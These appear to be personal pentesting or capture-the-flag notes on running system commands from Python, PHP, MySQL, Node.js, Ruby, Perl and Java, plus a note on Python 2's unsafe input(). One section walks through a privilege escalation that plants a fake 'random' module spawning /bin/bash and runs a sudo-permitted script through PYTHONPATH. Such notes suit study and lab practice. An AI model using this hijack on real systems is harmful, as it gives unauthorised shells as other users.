#### Python
```
import subprocess
output = subprocess.check_output('whoami', shell=True)
print(output.decode())
```
- execute system commands
- can also use:
```
import os
os.system('whoami')
```

hijacking imported module for priv esc
- user has sudo privs for python script that imports "random" module
- in same directory as script, run:
```
echo "import os" > random.py
```
- creates first line of new file. then:
```
echo 'os.system("/bin/bash")' >> random.py
```
- `cat random.py` should show:
```
import os
os.system("/bin/bash")
```
- then make modifiable:
```
chmod +x random.py
```
- set current directory as pythonpath:
```
export PYTHONPATH=/home/alice:$PYTHONPATH
```
- then run the command that has sudo privs:
```
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
- should create shell as rabbit user
#### Python2 v Python3
- absence of parentheses in print argument indicates script is written in python 2
	- Python 2: print is a statement, so parentheses are optional unless needed for grouping.
	- Python 3: print is a function, so parentheses are required:
		- Ex: `print("Website is up")`
- Using `input()` in Python2 can lead to security vulnerabilities because it evaluates user input as code.
	- Python 2:
		- `input()` function:
			 - Parses the user input as a Python expression using `eval()`
			- Equivalent to `eval(raw_input(prompt))`
			- Dangerous if user input is not trusted, as it can execute arbitrary code.
		- `raw_input()` function:
			- Reads user input as a string without evaluation.
	- Python 3:
		- `input()` function:
			- Reads user input as a string.
			- Equivalent to `raw_input()` in Python 2.
		- `raw_input()` function:
			- Removed in Python 3.
			- If you need to evaluate user input as code (which is generally discouraged), you must explicitly use `eval()`

#### PHP
```
<?php
echo shell_exec('whoami');
```
- can also execute code with `exec()` or `system()`

```
php -a
```
- bash to get an interactive php terminal
#### MySQL
```
SELECT sys_exec('whoami');
```
- only works if lib_mysqludf_sys is installed
	- otherwise, need to escape

#### Node.js (Javascript)
```
const { exec } = require('child_process');

exec('whoami', (error, stdout, stderr) => {
    if (error) {
        console.error(`Error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`Stderr: ${stderr}`);
        return;
    }
    console.log(`Output: ${stdout}`);
});
```
- `child_process` to execute

#### Ruby
```
puts `whoami`
```
- backticks to execute or `system()`:
```
system('whoami')
```

#### Perl
```
system('whoami');
```

#### Java
```
import java.io.*;

public class Main {
    public static void main(String[] args) throws Exception {
        Process process = Runtime.getRuntime().exec("whoami");
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
    }
}
```
- `Runtime.getRuntime().exec()` to execute system commands